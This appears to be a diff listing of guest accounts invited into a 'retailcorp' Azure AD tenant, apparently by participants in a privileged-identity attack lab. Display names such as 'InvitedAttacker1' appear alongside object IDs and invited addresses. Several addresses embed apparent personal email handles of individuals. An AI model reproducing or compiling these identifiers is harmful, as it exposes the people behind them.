+InvitedAttacker1       96249900-be86-4780-a15e-a41e743281de pim@cronostestlab.onmicrosoft.com                       pim_cronostestlab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    c2f70dc1-72f7-4659-8b45-0ed554c39799 pim@cursoazurenacho.onmicrosoft.com                     pim_cursoazurenacho.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    04b82587-436b-42ab-a0e5-fc738ec84525 pim@cybercadence.onmicrosoft.com                        pim_cybercadence.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    582bb6c3-07d7-418f-8b56-0b7b83fc4564 pim@cyberwolf8.onmicrosoft.com                          pim_cyberwolf8.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim user               fefe7029-160e-4b97-9630-02a3dbe09522 pim@dahiyasec.onmicrosoft.com                           pim_dahiyasec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimguest               77d28c3e-71a6-44c9-b5d0-cd74d16ab629 pim@destroypo.onmicrosoft.com                           pim_destroypo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim pom                d40a4b8e-e8cb-4c2d-90c7-55f69c89ef3e pim@dextrsec.onmicrosoft.com                            pim_dextrsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 d508373f-0571-4986-b0e0-f0e46949617c pim@dfseclab.onmicrosoft.com                            pim_dfseclab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    42dcd846-484d-4e12-b8d3-809625f37cfa pim@dh0ckdomain1.onmicrosoft.com                        pim_dh0ckdomain1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    b601c020-4057-4280-8e5a-3a7bee03c359 pim@drala.onmicrosoft.com                               pim_drala.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    f6c48eb8-faba-44b1-80dc-3417187b94fc pim@ecohack.onmicrosoft.com                             pim_ecohack.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM User               47f18a47-cd11-42c1-a89e-4cd3f0e2708b pim@edelfa.onmicrosoft.com                              pim_edelfa.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Test User              325cd9f9-d8cd-4610-94aa-63c941395b6f pim@ekorp.onmicrosoft.com                               pim_ekorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    2cf1ef32-c363-4230-ba07-f4b84219c82a pim@elbertcirinohotmail.onmicrosoft.com                 pim_elbertcirinohotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    2189b229-5f81-44ec-a71a-9f7f048ffa3a pim@endsectst.onmicrosoft.com                           pim_endsectst.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Hamker                 dd3c6cca-d178-4eab-8288-9db60c45f101 pim@error1337.onmicrosoft.com                           pim_error1337.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+attackerAd1            db1aecd1-02df-457d-b93b-b9579cc0750b pim@espritazure.onmicrosoft.com                         pim_espritazure.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimUserAzTest          1fae1e09-ce56-45e3-9d1c-94a2ddcc7de4 pim@fa3stebanoutlook.onmicrosoft.com                    pim_fa3stebanoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d2567766-4fca-46d5-a6ec-9ef175586551 pim@fakesch001.onmicrosoft.com                          pim_fakesch001.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    a3762da2-8946-4de1-a34b-75939108cb0d pim@ffsazpt.onmicrosoft.com                             pim_ffsazpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    8a48b252-3552-4b26-8c2e-28dcd2c87c07 pim@fmhcc.onmicrosoft.com                               pim_fmhcc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    ee7b7874-54c8-41f2-b0d9-f70586fa2ebd pim@foreverdomain.onmicrosoft.com                       pim_foreverdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimv1                  46c3fa83-d82a-4a19-8ac7-2a37f2e3de44 pim@foxtrot165.onmicrosoft.com                          pim_foxtrot165.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    8154c313-cbf2-4d76-9e72-9e32e7498c50 pim@fuckingcorp.onmicrosoft.com                         pim_fuckingcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User                   a505cb2f-6a9f-432f-94bb-0a2a82e96562 pim@gabrujas.onmicrosoft.com                            pim_gabrujas.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6199f431-8d61-47e8-a2b2-858c9c2b11bd pim@galminyana.onmicrosoft.com                          pim_galminyana.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+atekoumpare            913fac11-7967-4fb1-8561-2501d4be1742 pim@GeorgeSkouroupathishotmail.onmicrosoft.com          pim_GeorgeSkouroupathishotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    875f6115-da90-489b-aace-8d4e42854998 pim@gfseclocal.onmicrosoft.com                          pim_gfseclocal.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+at@cker87              4d9f01a4-c1f9-45a7-a280-e30de5868c78 pim@ghazni87.onmicrosoft.com                            pim_ghazni87.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    9ba312ce-da50-4685-a6d3-d9fd682379bb pim@giovannonacoscialunga.onmicrosoft.com               pim_giovannonacoscialunga.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    295beb65-601c-495d-95d3-39c04572ca91 pim@gizakormaniacmansion.onmicrosoft.com                pim_gizakormaniacmansion.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attack                 b7b55f86-50ba-4350-88da-cd09f078c433 pim@gizzu.onmicrosoft.com                               pim_gizzu.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               684dc3cd-7941-4603-9ba8-e98ce5469e2c pim@h3nm3n.onmicrosoft.com                              pim_h3nm3n.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    be4f25ca-61a1-4209-b843-e4dd42625419 pim@hackerash99.onmicrosoft.com                         pim_hackerash99.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim user               b5ee35ce-93e8-4882-ac45-d1a11e686525 pim@hawkwheels.onmicrosoft.com                          pim_hawkwheels.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim green              d9446176-cb19-443d-b292-b031e9e57107 pim@heesaf.onmicrosoft.com                              pim_heesaf.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    0a1b36fb-9aa3-493d-8fc7-b43c49bc5584 pim@heliikopter.onmicrosoft.com                         pim_heliikopter.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    affc4425-38c0-49b4-bf59-1e98f49bee6a pim@hmayvin.onmicrosoft.com                             pim_hmayvin.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    01164b4f-e5b5-4cbb-a01a-adb214744e5b pim@hostbrother.onmicrosoft.com                         pim_hostbrother.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6afdd0de-9ea7-4da8-8b4b-d076208e5533 pim@hxteam.onmicrosoft.com                              pim_hxteam.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimuser                5cae372b-42c8-4837-a078-ab3a397512bd pim@ichbinss.onmicrosoft.com                            pim_ichbinss.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+ping                   823951b5-dcdc-4fdf-b7d9-016451974c41 pim@ihackpy.onmicrosoft.com                             pim_ihackpy.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    cf81621a-0a76-414e-a3b6-d949597fe34a pim@initcrew.onmicrosoft.com                            pim_initcrew.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker02             9d21157b-fdf0-4cf1-8f9a-6913e43756ef pim@introtocartp.onmicrosoft.com                        pim_introtocartp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimTest                07866dad-3566-4f68-8e1c-733abc691c6e pim@isecauditors.cat                                    pim_isecauditors.cat#EXT#@retailcorp.onmicrosoft.com
+pim                    4925eded-26b7-4fc9-928f-f9fb014f2893 pim@isoah.onmicrosoft.com                               pim_isoah.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+asdasd                 104501d1-1886-479d-bdd6-add4fd81be5e pim@ispiriaz.onmicrosoft.com                            pim_ispiriaz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim user               9fd1a26a-82dd-4035-9400-6831b11aa1f5 pim@jasperpentest.onmicrosoft.com                       pim_jasperpentest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Hacker                 39436b6c-8154-4917-8cd2-27b7b6a42f91 pim@javipetruccihotmail.onmicrosoft.com                 pim_javipetruccihotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Jayateertha Pim Admin  04c7f944-4755-4a2e-b174-5325206620c4 pim@jayateerthag.onmicrosoft.com                        pim_jayateerthag.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6ddd992a-6294-4d61-a70b-7ce4c8330b0d pim@jkbikedays.onmicrosoft.com                          pim_jkbikedays.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    427e7c7a-ea22-40a8-8fdf-96b4135c43a1 pim@joelcarbajalesoutlook.onmicrosoft.com               pim_joelcarbajalesoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    e59435f9-b162-47af-a3dd-ed0bad5bd26b pim@johnhomelab.onmicrosoft.com                         pim_johnhomelab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    18c64d10-aa3c-48ff-b4e3-62b97efe5486 pim@jshawxpsoutlook.onmicrosoft.com                     pim_jshawxpsoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d07a4c88-f7e0-4f72-9670-e8c299a6a145 pim@kannanlynsixlive.onmicrosoft.com                    pim_kannanlynsixlive.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User02                 6fe43995-2716-4a50-a54a-3e3c34f352a9 pim@kheeweichiahotmail.onmicrosoft.com                  pim_kheeweichiahotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker-knt01         1b639f77-1691-44e4-9bdc-eaddcad0688c pim@kntdwaapt.onmicrosoft.com                           pim_kntdwaapt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+0000InvitedAttacker00… 7e806731-0022-48c3-aa97-5571e83e92bf pim@koelhosec.onmicrosoft.com                           pim_koelhosec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    ae87e9b3-7173-4605-8c90-cf7cfef65154 pim@kumardineshwarhotmail.onmicrosoft.com               pim_kumardineshwarhotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Chros                  5fd14652-dc04-41d5-97e5-f8470d93e586 pim@kunalcorp.onmicrosoft.com                           pim_kunalcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    827547f0-25b4-42eb-a8af-1ffaa94b286b pim@lab140193.onmicrosoft.com                           pim_lab140193.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    70b1d987-1cb3-45bc-9d80-5acc3364aa93 pim@labimmo.onmicrosoft.com                             pim_labimmo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    408a5a2e-251f-476e-82e9-afcea6ecf001 pim@lawmankhan.onmicrosoft.com                          pim_lawmankhan.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+soubhikpim             1db71c3f-fa68-4b71-b3e3-53aea35f767c pim@learnadpt.onmicrosoft.com                           pim_learnadpt.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d18d07ed-eb3d-4cbf-8014-2c6e218f4b27 pim@lefayjeyazad.onmicrosoft.com                        pim_lefayjeyazad.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim 01                 56c2a9e2-d598-4868-8097-54b0e6c99955 pim@lekharaj.onmicrosoft.com                            pim_lekharaj.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttackerfls     f63000b7-863c-474d-82f9-60c73162e617 pim@lorenzofamamsn.onmicrosoft.com                      pim_lorenzofamamsn.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    5bc61e94-45eb-4d93-a90d-80c0dee23a7a pim@m365x95628972.onmicrosoft.com                       pim_m365x95628972.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    26d314e3-4983-4570-abb9-bf8f3805a51a pim@m4z4rs.onmicrosoft.com                              pim_m4z4rs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                4362678a-7140-467c-b7ac-dd1c4db78ed3 pim@ma1ic3.onmicrosoft.com                              pim_ma1ic3.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim user test          eb9751ee-7a0a-42d2-acc1-e62929375f28 pim@mag227.onmicrosoft.com                              pim_mag227.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               7e6e82fd-fd4c-43a7-b858-32ce7d3ce9c1 pim@mahesheyoutlook.onmicrosoft.com                     pim_mahesheyoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    18adc140-9964-4574-b5fb-ff88a2e1cdef pim@maxwong0116.onmicrosoft.com                         pim_maxwong0116.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim test               b95af13f-4f1d-47b5-a27e-15e5e810c8c9 pim@mayankprajapati.onmicrosoft.com                     pim_mayankprajapati.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pentester02            580f1e3b-073c-4a42-8ee4-19d27be88c5b pim@mayare.onmicrosoft.com                              pim_mayare.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    47771589-d311-4fc5-936f-06ecb2955448 pim@mearls.onmicrosoft.com                              pim_mearls.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Malicious Mika         39c9a7b8-7bfc-4c25-9021-516c1dc02270 pim_mika@mikamartinsinc.onmicrosoft.com                 pim_mika_mikamartinsinc.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    88ac0c3f-26a9-4e39-a654-33db1e5f3f75 pim@mingsubdomain.onmicrosoft.com                       pim_mingsubdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                a87b9861-e34f-4101-8edd-301273097541 pim@mjg12.onmicrosoft.com                               pim_mjg12.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User 01                eec29aaf-dca0-4b5c-b228-9a6dd23df82a pim@mjh3z.onmicrosoft.com                               pim_mjh3z.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+yoyopim                dce67ead-02c3-4089-ab62-06e5691e7af6 pim@mrb34n.onmicrosoft.com                              pim_mrb34n.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    7275355c-6b7e-48da-8d37-b0d9afc43c25 pim@mwingconsulting.onmicrosoft.com                     pim_mwingconsulting.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    daa8b5cc-714b-4df3-855b-326977d81caa pim@mycorpvp.onmicrosoft.com                            pim_mycorpvp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    c90a733c-6dd3-4649-8c69-13e03aa9c3b7 pim@mynewdomainarchit.onmicrosoft.com                   pim_mynewdomainarchit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    ec07e5eb-2bf4-414e-b918-5bf16d4368d5 pim@n00bdi.onmicrosoft.com                              pim_n00bdi.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    2c75a12d-4769-422e-9661-ff0253dbd0b8 pim@naveenhaxor.onmicrosoft.com                         pim_naveenhaxor.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    c07e1baa-53be-4de0-b1f6-7496793d98e3 pim@notevilcorp.onmicrosoft.com                         pim_notevilcorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    bf889a0a-8fb5-49f2-8912-5ccfa85ee0fd pim@offensive1.onmicrosoft.com                          pim_offensive1.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Chandler Bing          cff3992a-ab19-4def-a9a6-47735e2b2e16 pim@onlyforlearning.onmicrosoft.com                     pim_onlyforlearning.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim Sec                b7123b94-6228-4a99-af60-df41a247db54 pim@opensecresearch.onmicrosoft.com                     pim_opensecresearch.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Victima Real           9459f14f-068c-4af3-b124-0cde633afb93 pim@orezlabazure.onmicrosoft.com                        pim_orezlabazure.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    ab870a64-7d95-4687-a576-f424303fe0fe pim@pennyco2.onmicrosoft.com                            pim_pennyco2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               da9198b9-c6a6-4b64-9731-122159394bf4 pim@pentestworld.onmicrosoft.com                        pim_pentestworld.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    7f8a89bc-c1d3-4536-a01a-fa35d63ce72f pim@pitcairntest.onmicrosoft.com                        pim_pitcairntest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Jaidev                 0893c4e0-e529-469e-9fbe-8de287c440c5 pim@policeuniversityjod.onmicrosoft.com                 pim_policeuniversityjod.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    e81afda9-9e6d-44c9-8f75-447207c29915 pim@pr2c.onmicrosoft.com                                pim_pr2c.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    df46ea06-ec68-4ba2-9c42-5dc40d37c05b pim@practicead2.onmicrosoft.com                         pim_practicead2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM_AD                 02202a55-3655-4400-a3e5-b21f8cb0573e pim@pranavdodiya72gmail.onmicrosoft.com                 pim_pranavdodiya72gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    c0496cc6-9321-408a-ba58-86f7eada38e4 pim@priyanka0109.onmicrosoft.com                        pim_priyanka0109.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       f324a411-4f33-45a1-8b89-879b0350f653 pim@psltlab.onmicrosoft.com                             pim_psltlab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               c9f6dae5-95ea-40a6-b7dc-d501e541874e pim@pwnedaz.onmicrosoft.com                             pim_pwnedaz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Hack RetailCorp    f76c54e6-96d5-4107-9be7-564d58bd1d09 pim@quachvidatlive.onmicrosoft.com                      pim_quachvidatlive.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    1ee8b5fc-1ddb-4e79-ac47-2e2e353a87f7 pim@r007kiegmail.onmicrosoft.com                        pim_r007kiegmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+grahamtest             acbb1973-0f0d-434d-9f3a-fcbca7091705 pim@ragamuffnrentals.com                                pim_ragamuffnrentals.com#EXT#@retailcorp.onmicrosoft.com
+pim                    42e4543d-43e4-4df9-b624-1e992da570cb pim@redteam777.onmicrosoft.com                          pim_redteam777.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Attacker               2d6f4b2f-3b5e-4da1-9341-c09031e6a13f PIM@redxxxploitz.onmicrosoft.com                        PIM_redxxxploitz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    29013c89-bf59-458b-93f3-dbcfede31d5b pim@romisdomain.onmicrosoft.com                         pim_romisdomain.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    73a6c4a1-99eb-4276-bd25-e262e1df5da1 pim@rtester.onmicrosoft.com                             pim_rtester.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    c7fa3537-5602-4861-8de0-052fce7ebc8f pim@sanderbo.onmicrosoft.com                            pim_sanderbo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    decf8a55-4c1e-43fe-b911-84fc53477a3f pim@saneem.onmicrosoft.com                              pim_saneem.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+RandomUser             fb028231-8b3d-40f5-ac17-9a995cc66424 pim@satemanxd.onmicrosoft.com                           pim_satemanxd.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    aef00f95-b905-4aae-a50e-c32d170bd430 pim@schmidholdinglb.onmicrosoft.com                     pim_schmidholdinglb.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Attacker25022023   4db298dc-1de7-47e5-9477-37bdf79a73ef pim@secdev23.onmicrosoft.com                            pim_secdev23.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    cfbaa842-67d2-4747-a3b3-fb7ba32cb794 pim@securatyazad.onmicrosoft.com                        pim_securatyazad.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pragya Johari          5b40ef73-c7ad-43a5-b511-84f062ee1a55 pim@security12345.onmicrosoft.com                       pim_security12345.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    716e2f82-3bee-48fa-8399-12f2061360cb pim@securityowl.onmicrosoft.com                         pim_securityowl.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Hecker Man             e690acc6-9185-4ad7-8851-59f0e9cac129 pim@shaxity.onmicrosoft.com                             pim_shaxity.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimadmin               5ed53989-61c2-4a25-afda-a6209892bd17 pim@sixasterisks.onmicrosoft.com                        pim_sixasterisks.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    376c2c40-0f1b-420c-8a8b-07e800bfbf43 pim@smhfleettest.onmicrosoft.com                        pim_smhfleettest.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    d7e045c9-b46a-4c46-bea7-3ac9dfa68292 pim@smidik.onmicrosoft.com                              pim_smidik.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+tata                   ebcbff53-29dc-43f5-b925-3020026cb989 pim@sniper007.onmicrosoft.com                           pim_sniper007.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pimpim                 1ff60c03-d178-4bb0-9c0f-b687ed9b947d pim@sofmarlor.onmicrosoft.com                           pim_sofmarlor.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim bro                6ebcce50-ded4-4963-946a-5b4f0d24cc75 pim@suncitycorp.onmicrosoft.com                         pim_suncitycorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    40fdbdfa-50a3-4ab9-b439-1ecbd6463cff pim@talaatwave.onmicrosoft.com                          pim_talaatwave.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    d091e375-d8fb-4d03-bd07-34b9557833af pim@tbhaxor.onmicrosoft.com                             pim_tbhaxor.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    16923d36-ec32-4cc2-9e23-0023dc7e5222 pim@testenzo.onmicrosoft.com                            pim_testenzo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    6d0fe6d4-3a51-4434-90f7-e819006ff212 pim@testingmead.onmicrosoft.com                         pim_testingmead.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    e2748061-8610-4ba0-9504-49f094fd15f4 pim@thehackingfactory.onmicrosoft.com                   pim_thehackingfactory.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    1ad10896-1441-4b6d-b88b-96690abf48e0 pim@tinyboylabs.onmicrosoft.com                         pim_tinyboylabs.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    825322df-ea24-4bea-a552-0414ffae3196 pim@tnjg4.onmicrosoft.com                               pim_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+attackeruser1          d158080c-a12f-4f9f-adb4-ed48de18eec3 pim@toadsec.onmicrosoft.com                             pim_toadsec.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+User01                 44316fee-3a34-4d62-9761-1ca7d020546c pim@tobiawsoutlook.onmicrosoft.com                      pim_tobiawsoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PimUser                07fedea3-fa5f-482b-a4d7-cb25d41b806e pim@tohzjmsn.onmicrosoft.com                            pim_tohzjmsn.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+FNU LNU                fc4e689f-256b-4344-a8bb-9cdaf588b828 pim@totallysecurecorporation.onmicrosoft.com            pim_totallysecurecorporation.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM Ad                 f888ab8c-03c6-42aa-ac04-af62cb8a5162 pim@trainingscorp.onmicrosoft.com                       pim_trainingscorp.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM User               8527218e-c409-409c-83a8-c271d90ea9a9 pim@ulduar.onmicrosoft.com                              pim_ulduar.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    64527386-3c61-40b5-b3aa-d8621cc4e9da pim@urbanhit.onmicrosoft.com                            pim_urbanhit.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim User               3a6ee54e-1c0d-42d7-920a-750821593b3e pim@varungup97gmail.onmicrosoft.com                     pim_varungup97gmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    5d0e6627-f841-4704-a12a-a44446ced617 pim@victimcorpxyz.onmicrosoft.com                       pim_victimcorpxyz.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    48df008d-5b62-4d25-9169-646841c93ca4 pim@vijaytikudaveyahoo.onmicrosoft.com                  pim_vijaytikudaveyahoo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+demo-pim               f0e2f228-3f42-460e-ad8b-97c3b3cc791c pim@vishalrajinfosecprogmail.onmicrosoft.com            pim_vishalrajinfosecprogmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    e1ad2f3a-f8f3-4aae-85e7-26e69186d3c0 pim@vpaschlive.onmicrosoft.com                          pim_vpaschlive.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    aad3d7a0-dd57-41cb-a27c-1fd9cf68733a pim@wanglo.onmicrosoft.com                              pim_wanglo.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1021    f7c30037-d51a-40e5-a8b3-17dc9699788b pim@warcloudlab.onmicrosoft.com                         pim_warcloudlab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim test               99cd9c82-9f2c-4d08-8f39-2899a36ad471 pim@wcuestascobaltcore.onmicrosoft.com                  pim_wcuestascobaltcore.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    53c2864a-0c42-40d9-bbc6-4bc9575b698b pim@weird2.onmicrosoft.com                              pim_weird2.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+PIM                    782bf4e6-7219-4e4d-8ab4-e8802cb60c14 pim@welcomechanhotmail.onmicrosoft.com                  pim_welcomechanhotmail.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    1bcb61ef-2636-4dab-8363-a41d99e8e112 pim@wolfatwolfden.onmicrosoft.com                       pim_wolfatwolfden.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+Pim                    f9772263-9f7d-4658-a31a-aad88f891821 pim@wonderenterprise.onmicrosoft.com                    pim_wonderenterprise.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    4f8b7a8b-634b-4bd7-901f-632b411e629b pim@wxyzoiltank.onmicrosoft.com                         pim_wxyzoiltank.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    64d71d2f-4e55-48f3-8a18-2cbea958427f pim@yelankoudoutlook.onmicrosoft.com                    pim_yelankoudoutlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim_user_for_lab       e2db4fbc-928a-4621-ac9c-7633d0e7e187 pim@yoavc118outlook.onmicrosoft.com                     pim_yoavc118outlook.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    39f050b4-5b82-434e-a590-52a3c2e00e69 pim@zbtbr.onmicrosoft.com                               pim_zbtbr.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+pim                    26978895-fffe-4c82-a17c-56e39c7cb85f pim@zebux.org                                           pim_zebux.org#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       8a7c8514-5a75-4cc5-9bf1-f706f0268cd2 pim@0xjslab.onmicrosoft.com                             pim_0xjslab.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       812ec42e-636c-4255-8c84-1b4b0438e6f1 pim_1957@outlook.com                                    pim_1957_outlook.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker1       434d270e-1dd1-40f0-8a72-902bf1f8bfcc pim@210298.onmicrosoft.com                              pim_210298.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
+InvitedAttacker2       48ca29b4-13c6-482b-93a1-71f08c6073ad pim_3333@tnjg4.onmicrosoft.com                          pim_3333_tnjg4.onmicrosoft.com#EXT#@retailcorp.onmicrosoft.com
